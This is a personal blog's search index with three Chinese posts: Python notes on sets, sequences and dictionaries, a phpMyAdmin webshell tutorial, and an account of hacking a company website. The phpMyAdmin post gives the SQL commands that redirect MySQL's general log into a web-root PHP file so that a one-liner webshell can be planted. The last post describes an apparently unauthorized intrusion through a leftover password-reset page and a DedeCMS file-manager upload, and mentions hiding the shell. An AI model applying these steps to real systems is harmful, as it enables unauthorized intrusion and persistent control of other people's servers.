      <content type="html"><![CDATA[<p><img src="/2018/10/29/Python学习笔记/1.jpg" alt=""></p><p>入坑了python3 知识点颇多 看了一遍 看第二遍时候发现 和没看没什么两样 所以把某些知识点 记录一下 加深印象也方便 忘记时候查看</p><a id="more"></a><h1 id="组和数据类型"><a href="#组和数据类型" class="headerlink" title="组和数据类型"></a>组和数据类型</h1><h2 id="集合类型及操作"><a href="#集合类型及操作" class="headerlink" title="集合类型及操作"></a>集合类型及操作</h2><p>集合元素之间无序，每个元素唯一 不存在相同元素 ，集合元素是不可变数据类型，在Python中集合用{}表示，元素间用 “,”分隔</p><p>也可以用set()建立集合</p><p><img src="/2018/10/29/Python学习笔记/2.jpg" alt=""></p><p>set()将每个字符单独拆分 变成集合的元素</p><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p><img src="/2018/10/29/Python学习笔记/3.jpg" alt=""></p><p>可能有点难理解 那我们就打一下 </p><blockquote><blockquote><blockquote><p><code>a = {&quot;p&quot;,&quot;y&quot;,123}</code><br><code>b = set(&quot;pypy123&quot;)</code><br><code>a-b</code><br><code>{123}</code><br><code>b-a</code><br><code>{&#39;2&#39;, &#39;3&#39;, &#39;1&#39;}</code><br><code>a&amp;b</code><br><code>{&#39;y&#39;, &#39;p&#39;}</code><br><code>a|b</code><br><code>{&#39;3&#39;, &#39;1&#39;, &#39;2&#39;, &#39;y&#39;, 123, &#39;p&#39;}</code></p></blockquote></blockquote></blockquote><p>在四种基本操作符上python提供了增强操作符</p><p>通过四种操作符于赋值符号 来完成对集合s的更新</p><p><img src="/2018/10/29/Python学习笔记/4.jpg" alt=""></p><h3 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h3><p><code>s.add(x) 将x增加到集合s</code></p><p><code>s.discard(x) 从集合s中移除x 如果x不再集合s中，不报错</code></p><p><code>s.remove(x) 从集合s中移除x 如果x不再集合s中，报出KeyError</code></p><p><code>s.clear()移除s中所有元素</code></p><p><code>s.pop() 随机返回一个s元素 s为空则 报出KeyError</code></p><p><code>s.copy 返回集合s的一个副本</code></p><p><code>len(s) 返回集合s的元素个数</code></p><p><code>x in s 判断x是否在s中 是则True 否则False</code></p><p><code>set(x)将其他类型变量转换为集合</code></p><h3 id="集合类型总结"><a href="#集合类型总结" class="headerlink" title="集合类型总结"></a>集合类型总结</h3><p>集合类型 适用于包含关系的比较</p><p>举个例子</p><p><img src="/2018/10/29/Python学习笔记/5.jpg" alt=""></p><p>还有一个非常重要的 <u>数据去重</u> 就是利用 集合类型不能重复的特点</p><p>例如将一个List 去掉其中的重复元素 这里就可以用集合进行数据去重 非常简单容易</p><p><img src="/2018/10/29/Python学习笔记/6.jpg" alt=""></p><p>这里先用set 将list转换成集合来达到了 去重的目的 然后将集合在转换为列表。</p><h2 id="序列类型及操作"><a href="#序列类型及操作" class="headerlink" title="序列类型及操作"></a>序列类型及操作</h2><p>序列类型包括 字符串类型 元组类型和列表类型</p><h3 id="序列操作符"><a href="#序列操作符" class="headerlink" title="序列操作符"></a>序列操作符</h3><p><code>x in s 如果x是序列s的元素则返回True 否则返回Fals</code></p><p><code>s+t 链接两个序列 s+t</code></p><p><code>s * n或n * s 将序列s复制n次</code></p><p><code>s[i] 索引返回s中的第i个元素</code></p><p><code>s[i:j:k] 切片返回序列s中 i到j 且步长为k的元素序列</code></p><h3 id="序列函数和方法"><a href="#序列函数和方法" class="headerlink" title="序列函数和方法"></a>序列函数和方法</h3><p>len(s) 返回序列s的长度</p><p>min(s) 返回序列s的最小元素</p><p>max(s) 返回序列s的最大元素</p><p>s.count(x) 返回序列s中出现x的次数</p><h3 id="元组类型及操作"><a href="#元组类型及操作" class="headerlink" title="元组类型及操作"></a>元组类型及操作</h3><p>元组是序列类型的一种,使用() 或tuple()创建 </p><p><img src="/2018/10/29/Python学习笔记/7.jpg" alt=""></p><p>元素间用,分隔。元组创建以后不能修改</p><p>元组继承了序列全部通用操作 </p><h3 id="列表类型及操作"><a href="#列表类型及操作" class="headerlink" title="列表类型及操作"></a>列表类型及操作</h3><p>列表是序列类型的一种,使用[] 或list()创建 </p><p><img src="/2018/10/29/Python学习笔记/8.jpg" alt=""></p><p>元素间用,分隔。列表创建可以随意修改</p><h3 id="列表类型操作函数和方法"><a href="#列表类型操作函数和方法" class="headerlink" title="列表类型操作函数和方法"></a>列表类型操作函数和方法</h3><p>到这里内容很多 一会还要去上课 (其实是懒得打了)就从网上找了两张图 很详细</p><p><img src="/2018/10/29/Python学习笔记/9.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/10.jpg" alt=""></p><h3 id="序列类型总结"><a href="#序列类型总结" class="headerlink" title="序列类型总结"></a>序列类型总结</h3><p>序列类型 包括字符串 列表 元组</p><p>元组操作于序列基本相似，列表的话再序列基础上增加很多 更加灵活 </p><h2 id="字典类型及操作"><a href="#字典类型及操作" class="headerlink" title="字典类型及操作"></a>字典类型及操作</h2><h3 id="字典类型的定义"><a href="#字典类型的定义" class="headerlink" title="字典类型的定义"></a>字典类型的定义</h3><p>映射是一种键(索引)和值(数据)的对应</p><p>​    “城市”:”北京”</p><p>​    “姓名”:”周某人”</p><p>字典是键值对的集合，键值对之间无序</p><p>键值对：键是数据索引的扩展</p><p>采用{}和dict()创建键值对用·冒号:表示</p><p><img src="/2018/10/29/Python学习笔记/11.jpg" alt=""></p><p>在字典变量中通过建获得值 a[“中国”] 则会出现北京</p><h3 id="字典类型操作函数和方法"><a href="#字典类型操作函数和方法" class="headerlink" title="字典类型操作函数和方法"></a>字典类型操作函数和方法</h3><p><img src="/2018/10/29/Python学习笔记/12.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/13.jpg" alt=""></p><h3 id="字典类型的应用场景"><a href="#字典类型的应用场景" class="headerlink" title="字典类型的应用场景"></a>字典类型的应用场景</h3><p>统计数据出现的次数，数据是键 次数是值</p><p>主要作用：表达键值对数据 进而操作</p><h3 id="字典类型总结"><a href="#字典类型总结" class="headerlink" title="字典类型总结"></a>字典类型总结</h3><p>映射关系采用键值对表示</p><p>字典类型采用{}和dict()创建 键值对之间用:隔开</p><p>d[key] 既可以索引也可以赋值</p><p>牢记字典类型的操作函数</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php myadmin写shell</title>
      <link href="/2018/08/26/php%20myadmin%D0%B4shell/"/>
      <url>/2018/08/26/php%20myadmin%D0%B4shell/</url>
      <content type="html"><![CDATA[<p>有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 </p><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/1.png" alt=""></p>  <a id="more"></a> <h3 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h3><p>登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。</p><p>这时候我们需要换个思路</p><h3 id="利用mysql-错误日志写入一句话"><a href="#利用mysql-错误日志写入一句话" class="headerlink" title="利用mysql 错误日志写入一句话"></a>利用mysql 错误日志写入一句话</h3><p>这里需要先设置 general log (日志保存状态)general log file(日志保存路径)</p><p>先执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'general%'</span> a</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/2.png" alt=""></p><p>我们需要把general log 改为ON 也就是打开状态</p><p>还要把general log file路径改为网站的根目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> global general_log = <span class="string">"ON"</span>; </span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> global <span class="attribute">general_log_file</span>=<span class="string">'D:/stduy/PHPTutorial/WWW/infos.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/3.png" alt=""></p><p>执行完后因为我是本地搭建环境所以可以看到成功创建了</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/4.png" alt=""></p><p>现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/5.png" alt=""></p><p>之后我们菜刀直接链接即可</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/6.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>网上有许多相关的文章 不过自己写一遍印象才会更深刻吧</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php myadmin </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透某企业</title>
      <link href="/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/"/>
      <url>/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/</url>
      <content type="html"><![CDATA[<p>在家无聊，突然想到博客搞上也有数天 没时间写文章，今天正好无聊</p><h2 id="实战内容"><a href="#实战内容" class="headerlink" title="实战内容"></a>实战内容</h2><h3 id="确定目标站"><a href="#确定目标站" class="headerlink" title="确定目标站"></a>确定目标站</h3><p><img src="/2018/08/09/渗透某企业/1.png" alt=""></p><a id="more"></a><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>相信很多人吧都会忽略信息收集这一块，完整的信息收集应该包括</p><p>收集 whois 邮箱</p><p>收集 子域名 c段 旁站</p><p>收集网站架构 运行的服务 对应的端口 探测 waf</p><p>google hacking 敏感文件</p><p> 收集网站的 cms 信息</p><h3 id="有所发现"><a href="#有所发现" class="headerlink" title="有所发现"></a>有所发现</h3><p>在信息收集的过程中我发现网站右上脚有</p><p><img src="/2018/08/09/渗透某企业/2.png" alt=""></p><p>因为主站是伪静态 我本人确实很排斥这种伪静态 我就点了英文版的站 就发现 </p><p>主站的url:<a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a></p><p>英文版url:<a href="http://www.xxx.com/en" target="_blank" rel="noopener">www.xxx.com/en</a></p><p>原来是分目录 English的站并没有做伪静态</p><p>准备对准他下手 习惯性的先扫描一番</p><p><img src="/2018/08/09/渗透某企业/3.png" alt=""></p><p>我发现了此文件 ,打开一看我尼玛 管理员真的粗心,是一个密码重置，管理员居然没有删</p><p><img src="/2018/08/09/渗透某企业/4.png" alt=""></p><p>因为我知道有admin 所以第一步直接填了admin 第二步即可重置，改完密码直接进入后台</p><p><img src="/2018/08/09/渗透某企业/5.png" alt=""></p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>dede cms拿shell很简单 有个文件管理器直接可上传get shell</p><p><img src="/2018/08/09/渗透某企业/6.png" alt=""></p><p>拿到shell后可直接跨目录</p><p>因为信息收集我发现是apache 还有.htacces文件 可以更好的隐藏我们的shell 这里我就不演示了</p><p>此篇没有什么技术含量 只当是做个笔记而已</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
